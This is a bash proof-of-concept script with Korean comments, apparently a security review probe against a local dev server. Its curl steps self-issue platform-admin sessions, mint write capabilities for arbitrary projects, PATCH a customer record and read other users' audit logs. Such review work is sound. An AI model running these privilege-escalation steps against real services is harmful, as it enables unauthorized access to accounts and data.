#!/usr/bin/env bash
# R1-C1: 프리뷰 origin(5174)에서 실행되는 생성 코드가 /dev/session으로 editor·platform-admin 세션을 스스로 발급해
#        write capability 발급 → PATCH 성공, 전체 사용자 감사 로그 열람까지 가능한지 확인한다.
# 부작용: 고객 1명(C200)의 status를 "현재 값 그대로" PATCH한다(값 변화 없음). 감사 로그에 review-probe 기록이 남는다.
# 토큰 원문은 출력하지 않는다.
set -euo pipefail
P=http://localhost:7200
ORIGIN=http://localhost:5174          # 생성 코드가 실행되는 프리뷰 origin
PROJECT="review-probe-$(date +%s)"    # 격리용 새 projectId (프로젝트 존재 여부를 서버가 확인하지 않음)
j() { node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{const v=JSON.parse(s);console.log(eval(process.argv[1]))})' "$1"; }

echo "== 1. 프리뷰 origin에서 POST /dev/session roles=[viewer,editor,platform-admin] (CORS 응답 헤더 확인)"
HDRS=$(mktemp)
BODY=$(curl -s -D "$HDRS" -X POST "$P/dev/session" -H "Origin: $ORIGIN" -H 'Content-Type: text/plain' \
  --data '{"user":"review-probe","roles":["viewer","editor","platform-admin"]}')
grep -i '^access-control-allow-origin' "$HDRS" | tr -d '\r'
echo "$BODY" | j '"status: token issued=" + (typeof v.token==="string") + ", roles=" + JSON.stringify(v.claims.roles)'
ADMIN=$(echo "$BODY" | j 'v.token')

echo "== 2. 같은 origin에서 POST /capabilities mode=write (임의 projectId)"
CAP=$(curl -s -X POST "$P/capabilities" -H "Origin: $ORIGIN" -H "Authorization: Bearer $ADMIN" -H 'Content-Type: application/json' \
  --data "{\"projectId\":\"$PROJECT\",\"mode\":\"write\",\"env\":\"preview\",\"apiIds\":[\"customers\"],\"ttlSec\":3600}")
echo "$CAP" | j '"write capability issued=" + (typeof v.token==="string") + ", mode=" + v.claims.mode + ", ttlSec=" + v.claims.ttlSec'
WCAP=$(echo "$CAP" | j 'v.token')

echo "== 3. 현재 C200 status 조회 후 같은 값으로 PATCH (쓰기 판정 통과 여부만 확인)"
H=(-H "Origin: $ORIGIN" -H "Authorization: Bearer $ADMIN" -H "X-Toi-Project: $PROJECT" -H "X-Toi-Capability: $WCAP" -H "X-Toi-Reason: review%20probe%20R1")
CUR=$(curl -s "$P/proxy/customers/customers/C200" "${H[@]}" | j 'v.status')
echo "current status=$CUR"
curl -s -o /dev/null -w 'PATCH /customers/C200 -> HTTP %{http_code}\n' -X PATCH "$P/proxy/customers/customers/C200" "${H[@]}" \
  -H 'Content-Type: application/json' --data "{\"status\":\"$CUR\"}"

echo "== 4. platform-admin 세션으로 GET /audit (projectId 필터 없음) → 다른 사용자 기록 열람"
curl -s "$P/audit?limit=1000" -H "Origin: $ORIGIN" -H "Authorization: Bearer $ADMIN" \
  | j '"records=" + v.length + ", distinct users=" + new Set(v.map(r=>r.user)).size + ", users other than review-probe=" + new Set(v.filter(r=>r.user!=="review-probe").map(r=>r.user)).size + ", records with reason text=" + v.filter(r=>r.reason).length'

echo "== 5. 비교: 생성 코드가 받는 viewer 세션 + read capability 로는 다른 projectId capability도 발급됨(프로젝트 소속 검증 없음)"
VIEW=$(curl -s -X POST "$P/dev/session" -H 'Content-Type: application/json' --data '{"user":"review-probe-viewer","roles":["viewer"]}' | j 'v.token')
curl -s -X POST "$P/capabilities" -H "Authorization: Bearer $VIEW" -H 'Content-Type: application/json' \
  --data '{"projectId":"someone-elses-project","mode":"read","env":"live","ttlSec":3600}' | j '"read capability for arbitrary project issued=" + (typeof v.token==="string") + ", env=" + v.claims.env'
rm -f "$HDRS"
